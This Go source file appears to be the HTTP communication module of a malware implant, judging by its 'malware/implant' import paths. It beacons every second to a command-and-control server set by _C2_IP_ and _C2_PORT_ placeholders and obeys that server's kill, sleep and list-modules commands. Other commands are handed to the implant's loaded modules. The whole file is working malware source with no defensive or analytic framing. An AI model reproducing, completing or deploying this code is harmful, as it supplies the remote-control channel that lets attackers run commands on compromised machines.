package http_network

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"malware/common/messages"
	"malware/common/types"
	"malware/implant/included_modules"
	"net/http"
	"time"

	"github.com/golang/protobuf/jsonpb"
)

type state struct {
	running bool
}

type settings struct {
	state *state
	host  string
}

var marshal = &jsonpb.Marshaler{}

func (settings settings) sendMessage(r *messages.CheckCmdRequest) *messages.CheckCmdReply {
	req_string, err := marshal.MarshalToString(r) //r.XXX_Marshal([]byte{}, true)
	if err != nil {
		return nil
	}

	req, err := http.NewRequest("POST", "http://"+settings.host, bytes.NewBufferString(req_string))
	req.Header.Set("Content-Type", "application/json")

	if err != nil {
		return nil
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	msg := &messages.CheckCmdReply{}
	err = jsonpb.UnmarshalString(string(body), msg) //msg.XXX_Unmarshal(body)

	if err != nil {
		return nil
	}

	return msg
}

/*
	client := messages.NewMalwareClient(settings.state.conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Send a heartbeat message to ensure connection
	reply, err := client.CheckCommandQueue(ctx, messages.Implant_heartbeat(time.Now().Unix()))
	if err != nil {
		return
	}
*/
// Initialise connection
func (settings settings) doConnection() {
	// Send a heartbeat message to ensure connection
	reply := settings.sendMessage(messages.Implant_heartbeat(time.Now().Unix()))
	if reply == nil {
		return
	}

	// If a message doesn't contain a heartbeat we need to decode it
	if reply.GetHeartbeat() != 0 {
		return
	}

	if reply.GetKill() {
		settings.state.running = false
		return
	}

	if reply.GetSleep() != 0 {
		time.Sleep(time.Duration(reply.GetSleep()) * time.Second)
		return
	}

	// If message hasn't been handled yet, it is meant for one of the cores.
	// We provide a callback function to abstract away replying to the C2
	callback := func(msg *messages.CheckCmdRequest) {
		// Send message and ignore response
		settings.sendMessage(msg)
	}

	if reply.GetListmodules() {
		modules := ""
		for _, module := range included_modules.Modules {
			modules += module.ID() + " "
		}
		callback(messages.Implant_data("list", []byte(modules)))
		return
	}

	for _, module := range included_modules.Modules {
		if module.HandleMessage(reply, callback) {
			return // This message has been handled, no need to do anything more
		}
	}

	// Message was not handled, send error message
	callback(messages.Implant_error(settings.ID(), types.ERR_MODULE_NOT_IMPL))
}

func (settings settings) listenServer() {
	settings.state.running = true

	for settings.state.running {
		settings.doConnection()

		time.Sleep(1 * time.Second)
	}
}

func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.CheckCmdRequest)) bool {
	return false
}

func Init() {
	port := int32(_C2_PORT_)
	ip := "_C2_IP_"
	state := &state{}
	host := fmt.Sprintf("%s:%d", ip, port)

	settings := settings{state, host}

	settings.listenServer()
}

func (settings settings) Shutdown() {
}

func (settings) ID() string { return "http" }
